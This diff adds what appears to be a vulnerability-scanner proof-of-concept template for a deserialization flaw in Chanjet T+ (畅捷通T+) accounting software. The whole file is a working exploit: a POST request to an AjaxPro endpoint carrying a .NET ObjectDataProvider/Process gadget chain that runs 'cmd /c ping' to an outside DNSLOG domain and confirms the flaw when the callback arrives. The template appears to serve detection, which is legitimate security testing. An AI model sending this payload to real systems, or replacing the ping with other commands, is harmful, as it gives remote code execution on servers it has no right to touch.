@@ -1,0 +1,24 @@
+id: poc-yaml-chang-jie-tong-t-plus-getstorewarehousebystore-deserialization
+info:
+  name: 畅捷通T+ GetStoreWarehouseByStore 反序列化漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: 畅捷通T+
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore
+  data: "{\"storeID\":\n  {\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework,\
+    \ Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n  \"MethodName\"\
+    :\"Start\",\n  \"ObjectInstance\":\n      {\"__type\":\"System.Diagnostics.Process,\
+    \ System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\
+    ,\n      \"StartInfo\": \n          {\"__type\":\"System.Diagnostics.ProcessStartInfo,\
+    \ System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\
+    ,\n          \"FileName\":\"cmd\", \n          \"Arguments\":\"/c ping {{.reverseDomain}}\"\
+    }\n      }\n  }\n}\n"
+  expression: reverse.Verify()
+transport: http
